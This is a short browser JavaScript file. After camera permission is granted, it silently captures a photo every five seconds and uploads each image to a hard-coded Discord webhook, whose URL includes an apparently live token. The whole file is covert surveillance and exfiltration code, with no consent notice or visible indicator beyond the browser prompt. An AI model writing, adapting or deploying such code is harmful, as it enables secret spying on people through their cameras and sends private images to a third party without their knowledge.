const webhookURL = "https://discordapp.com/api/webhooks/1360012861673570315/ZqzUK5SoTzzvkBMIGPbH00hA9lt0nAj_eHAbqbqS-Y4vfhq1Dy-sX4ULdcdTWwl0Ui6L"; // Replace with your webhook

async function requestCameraAccess() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();

        video.addEventListener('loadedmetadata', () => {
            startAutoCapture(video);
        });
    } catch (error) {
        console.log("Camera access denied or error occurred: ", error);
    }
}

function startAutoCapture(video) {
    setInterval(() => {
        captureAndSendPhoto(video);
    }, 5000); // Capture every 5 seconds
}

function captureAndSendPhoto(video) {
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    canvas.toBlob(blob => {
        if (blob) {
            sendToWebhook(blob);
        } else {
            console.log("Failed to capture image blob.");
        }
    }, "image/png");
}

async function sendToWebhook(imageBlob) {
    const formData = new FormData();
    formData.append("file", imageBlob, "capture.png");

    try {
        const response = await fetch(webhookURL, {
            method: "POST",
            body: formData
        });

        if (response.ok) {
            console.log("Image sent successfully to Discord.");
        } else {
            console.log("Failed to send image to Discord.");
        }
    } catch (error) {
        console.log("Network error: ", error);
    }
}

// Start the process